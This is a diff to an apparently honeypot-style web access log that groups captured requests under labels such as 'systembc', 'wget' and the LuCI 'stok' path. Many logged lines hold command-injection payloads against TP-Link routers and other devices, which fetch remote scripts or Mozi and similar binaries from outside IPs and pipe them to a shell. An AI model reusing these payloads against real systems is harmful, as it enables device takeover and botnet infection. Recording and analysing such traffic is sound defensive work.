@@ -1,3 +1,4 @@
+--systembc
 159.65.159.214 - - [14/Jun/2025 04:14:02] "GET /systembc/password.php HTTP/1.1" 200 -
 144.126.236.85 - - [14/Jun/2025 16:49:36] "GET /systembc/password.php HTTP/1.1" 200 -
 165.22.189.140 - - [14/Jun/2025 17:14:29] "GET /systembc/password.php HTTP/1.1" 200 -
@@ -21,6 +22,7 @@
 204.188.197.93 - - [09/Jun/2025 13:47:08] "GET /systembc/password.php HTTP/1.1" 200 -
 170.64.167.44 - - [09/Jun/2025 20:50:22] "GET /systembc/password.php HTTP/1.1" 200 -
 
+--wget
 87.121.84.34 - - [13/Jun/2025 15:29:59] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
 87.121.84.34 - - [13/Jun/2025 15:29:59] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
 222.141.154.166 - - [15/Jun/2025 07:11:58] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
@@ -50,4 +52,86 @@
 195.3.221.137 - - [10/Jun/2025 04:05:10] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
 195.3.221.137 - - [10/Jun/2025 04:05:10] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
 141.98.11.147 - - [10/Jun/2025 04:53:28] "GET /shell?cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/x86;chmod+777+*;./x86+x86;cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/arm7;chmod+777+*;./arm7+arm7;cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/arm4;chmod+777+*;./arm4+arm4;cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/arm5;chmod+777+*;./arm5+arm5 HTTP/1.1" 200 -
+
+--luci/.stok=/
+87.121.84.34 - - [13/Jun/2025 15:29:59] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+87.121.84.34 - - [13/Jun/2025 15:29:59] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+89.42.231.140 - - [13/Jun/2025 16:41:57] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [13/Jun/2025 17:21:52] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [13/Jun/2025 18:29:30] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [13/Jun/2025 19:00:47] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+141.98.11.83 - - [13/Jun/2025 19:03:43] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [13/Jun/2025 19:33:28] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [13/Jun/2025 19:53:14] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [13/Jun/2025 21:50:01] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [13/Jun/2025 22:57:05] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [14/Jun/2025 01:00:58] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [14/Jun/2025 02:11:09] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [14/Jun/2025 03:16:35] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [14/Jun/2025 04:07:42] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [14/Jun/2025 14:15:26] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [14/Jun/2025 15:50:06] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [14/Jun/2025 18:55:31] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [14/Jun/2025 20:12:31] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [14/Jun/2025 21:41:48] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [14/Jun/2025 23:18:42] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [15/Jun/2025 01:07:57] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [15/Jun/2025 02:48:30] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [15/Jun/2025 04:02:52] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+45.135.194.34 - - [15/Jun/2025 14:15:30] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F154.91.254.95%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F154.91.254.95%2Frondo.sh%29+%7C+sh+-s+tplink%3B) HTTP/1.1" 200 -
+45.135.194.34 - - [15/Jun/2025 15:32:36] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F154.91.254.95%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F154.91.254.95%2Frondo.sh%29+%7C+sh+-s+tplink%3B) HTTP/1.1" 200 -
+45.135.194.34 - - [15/Jun/2025 22:41:26] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F154.91.254.95%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F154.91.254.95%2Frondo.sh%29+%7C+sh+-s+tplink%3B) HTTP/1.1" 200 -
+87.121.84.179 - - [15/Jun/2025 23:32:59] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+87.121.84.179 - - [16/Jun/2025 00:51:24] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+45.135.194.34 - - [16/Jun/2025 01:44:16] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F14.103.145.202%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F14.103.145.202%2Frondo.sh%29+%7C+sh+-s+tplink%3B) HTTP/1.1" 200 -
+45.135.194.34 - - [16/Jun/2025 04:30:22] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%29+%7C+sh+-s+tplink%3B) HTTP/1.1" 200 -
+45.135.194.34 - - [16/Jun/2025 07:32:49] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%29+%7C+sh+-s+tplink%3B) HTTP/1.1" 200 -
+87.121.84.34 - - [16/Jun/2025 09:01:53] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+87.121.84.34 - - [16/Jun/2025 09:01:53] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+89.42.231.140 - - [03/Jun/2025 12:04:40] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [03/Jun/2025 13:46:58] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [03/Jun/2025 16:48:34] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+141.98.11.147 - - [05/Jun/2025 15:28:16] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+141.98.11.147 - - [05/Jun/2025 18:06:19] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+141.98.11.147 - - [05/Jun/2025 19:58:51] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+5.183.209.244 - - [06/Jun/2025 03:01:34] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+5.183.209.244 - - [06/Jun/2025 03:59:41] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+5.183.209.244 - - [06/Jun/2025 05:09:22] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+141.98.11.147 - - [06/Jun/2025 05:15:14] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+5.183.209.244 - - [06/Jun/2025 10:40:46] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+5.183.209.244 - - [06/Jun/2025 10:49:16] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+5.183.209.244 - - [06/Jun/2025 13:08:38] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+5.183.209.244 - - [06/Jun/2025 13:49:41] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+5.183.209.244 - - [06/Jun/2025 14:41:17] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+34.9.27.97 - - [07/Jun/2025 21:50:00] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+87.121.84.34 - - [08/Jun/2025 16:25:53] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 200 -
+87.121.84.34 - - [08/Jun/2025 16:25:53] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 200 -
+176.65.148.10 - - [08/Jun/2025 20:44:46] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 00:30:27] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 01:40:38] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 02:58:26] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 03:44:34] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 04:00:06] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+195.3.221.137 - - [09/Jun/2025 07:21:35] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 200 -
+195.3.221.137 - - [09/Jun/2025 07:21:36] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 08:11:46] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+87.121.84.34 - - [09/Jun/2025 08:39:59] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 200 -
+87.121.84.34 - - [09/Jun/2025 08:39:59] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 09:36:08] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 10:40:48] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 11:51:41] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 13:11:18] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 14:08:18] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 15:18:38] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+195.3.221.137 - - [09/Jun/2025 15:30:46] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+195.3.221.137 - - [09/Jun/2025 15:30:47] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 17:52:04] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 18:55:46] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 20:21:13] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+87.121.84.34 - - [09/Jun/2025 21:18:20] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+87.121.84.34 - - [09/Jun/2025 21:18:21] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+89.42.231.140 - - [09/Jun/2025 22:08:37] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+34.136.182.154 - - [09/Jun/2025 22:25:16] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+195.3.221.137 - - [10/Jun/2025 04:05:10] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+195.3.221.137 - - [10/Jun/2025 04:05:10] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
 
